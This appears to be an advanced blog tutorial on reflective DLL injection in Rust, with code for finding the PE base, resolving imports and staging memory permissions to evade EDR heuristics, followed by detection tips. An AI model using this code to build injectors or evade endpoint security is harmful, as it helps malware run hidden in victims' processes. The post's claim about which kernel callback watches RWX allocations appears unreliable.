---
title: "Building a Reflective DLL Injector in Rust"
description: "Implementing reflective DLL injection from scratch in Rust — manual PE loading, IAT resolution, and in-memory execution without touching disk."
pubDate: 2025-08-20
tags: ["exploit-dev", "windows", "injection", "rust", "pe-loading", "evasion"]
difficulty: "advanced"
---

## What Is Reflective DLL Injection?

Standard DLL loading calls `LoadLibrary`, which reads a file from disk, maps it into memory, resolves imports, and registers it with the loader. Every step leaves artifacts: a path in the loaded-modules list, a file handle, a MEM_IMAGE region backed by a file on disk.

**Reflective injection** breaks this chain entirely. The DLL carries its own loader — a small function embedded in the binary that, when called with a pointer to the DLL's in-memory image, manually performs everything `LoadLibrary` would do:

1. Copies the image to a fresh anonymous allocation.
2. Applies base relocations if the preferred address is unavailable.
3. Resolves the Import Address Table (IAT) by walking `IMAGE_IMPORT_DESCRIPTOR` entries.
4. Calls `DllMain` with `DLL_PROCESS_ATTACH`.

No file on disk. No path in `PEB->Ldr`. The loader does not need to know anything about the DLL — it is entirely self-contained within the payload.

---

## Loader Architecture

```
inject_reflective_dll()
  |
  +-- allocate_rwx_region()        -- VirtualAllocEx in target, RW first
  |
  +-- write_dll_bytes()            -- WriteProcessMemory
  |
  +-- find_reflective_loader()     -- locate ReflectiveLoader export by hash
  |
  +-- create_remote_thread()       -- CreateRemoteThread -> ReflectiveLoader
        |
        +-- find_own_base()        -- walk back from RIP to MZ header
        |
        +-- parse_pe_headers()     -- locate sections, imports, relocs
        |
        +-- allocate_target_mem()  -- VirtualAlloc for final mapping
        |
        +-- copy_sections()
        |
        +-- apply_relocations()
        |
        +-- resolve_iat()          -- IMAGE_IMPORT_DESCRIPTOR walk
        |
        +-- call_dllmain()         -- DLL_PROCESS_ATTACH
```

The split is important: `inject_reflective_dll` runs in the injector process; everything from `find_own_base` downward runs inside the target process as part of `ReflectiveLoader`.

---

## Rust Implementation: `find_own_base`

The reflective loader, executing inside the target process, does not know where it was written. It must locate the start of the PE image by walking backwards from its own instruction pointer until it finds the `MZ` magic bytes:

```rust
#[cfg(target_arch = "x86_64")]
unsafe fn find_own_base() -> *const u8 {
    // Capture RIP via a dummy call return address trick
    let rip: usize;
    core::arch::asm!(
        "lea {0}, [rip]",
        out(reg) rip,
        options(nostack, nomem),
    );

    // Align down to 4096-byte page boundary and walk backwards
    let mut candidate = (rip & !0xFFF) as *const u8;
    loop {
        // Check for MZ magic (0x5A4D little-endian)
        if candidate.read() == b'M' && candidate.add(1).read() == b'Z' {
            return candidate;
        }
        // Step back one page; guard against wrap-around
        candidate = candidate.sub(0x1000);
        if candidate as usize == 0 {
            // Should never happen in a well-formed injection
            core::hint::unreachable_unchecked();
        }
    }
}
```

This is safe in practice because the DLL image is a contiguous allocation and the page containing `ReflectiveLoader`'s code is always within it.

---

## IAT Resolution via `IMAGE_IMPORT_DESCRIPTOR` Walk

Once the image is copied to its final allocation, imports must be resolved. Each entry in the import directory names a DLL and a list of functions. We call `LoadLibraryA` and `GetProcAddress` (both located by walking the export table of `kernel32.dll` in the target) to fill in each IAT slot:

```rust
unsafe fn resolve_iat(base: *mut u8, load_library: LoadLibraryFn, get_proc_addr: GetProcAddrFn) {
    let dos = base as *const IMAGE_DOS_HEADER;
    let nt  = base.add((*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    let import_dir = &(*nt).OptionalHeader.DataDirectory[1]; // IMAGE_DIRECTORY_ENTRY_IMPORT

    if import_dir.VirtualAddress == 0 {
        return; // no imports
    }

    let mut desc = base.add(import_dir.VirtualAddress as usize)
                       as *const IMAGE_IMPORT_DESCRIPTOR;

    while (*desc).Name != 0 {
        let dll_name = base.add((*desc).Name as usize) as *const i8;
        let dll_handle = load_library(dll_name);

        // OriginalFirstThunk = hint/name table; FirstThunk = IAT
        let mut thunk_ref = base.add((*desc).u.OriginalFirstThunk as usize)
                                as *const usize;
        let mut iat_entry = base.add((*desc).FirstThunk as usize)
                                as *mut usize;

        while *thunk_ref != 0 {
            let resolved = if *thunk_ref & IMAGE_ORDINAL_FLAG64 != 0 {
                // Import by ordinal
                get_proc_addr(dll_handle, (*thunk_ref & 0xFFFF) as *const i8)
            } else {
                // Import by name: skip the 2-byte Hint field
                let by_name = base.add(*thunk_ref as usize + 2) as *const i8;
                get_proc_addr(dll_handle, by_name)
            };

            *iat_entry = resolved as usize;
            thunk_ref  = thunk_ref.add(1);
            iat_entry  = iat_entry.add(1);
        }

        desc = desc.add(1);
    }
}
```

---

## EDR Bypass: Memory Permission Staging

A common EDR heuristic flags allocations that are simultaneously `PAGE_EXECUTE_READWRITE` — a permission combination that has no legitimate use in production software. To avoid this:

1. Allocate the target region as `PAGE_READWRITE`.
2. Copy the PE image and perform all relocations and IAT resolution while the pages are non-executable.
3. Call `VirtualProtect` to change only the executable sections (`.text`) to `PAGE_EXECUTE_READ` immediately before calling `DllMain`.

```rust
// Step 1 — allocate as RW only
let region = VirtualAlloc(
    ptr::null_mut(),
    image_size,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE,   // NOT PAGE_EXECUTE_READWRITE
);

// ... copy, relocate, resolve IAT ...

// Step 2 — flip .text to RX
let mut old_protect = 0u32;
VirtualProtect(
    text_section_va,
    text_section_size,
    PAGE_EXECUTE_READ,
    &mut old_protect,
);

// Step 3 — call DllMain
let dll_main: DllMainFn = core::mem::transmute(entry_point_va);
dll_main(region as HINSTANCE, DLL_PROCESS_ATTACH, ptr::null_mut());
```

This technique avoids the RWX allocation that many EDR kernel callbacks (e.g., `PsSetLoadImageNotifyRoutine` consumers) use as a trigger for deeper inspection.

---

## Conclusion

Reflective DLL injection remains a foundational technique in offensive tooling because it eliminates nearly all disk-based indicators while requiring only standard Windows API calls available in every process. Implementing it in Rust provides memory safety for the injector itself (no accidental buffer overflows in the loader logic) and produces compact, easily auditable code. Detection-side countermeasures should focus on anomalous `VirtualProtect` call sequences, unbacked executable regions (VAD entries with no file backing), and scanning process memory for PE headers not present in the loaded-modules list.
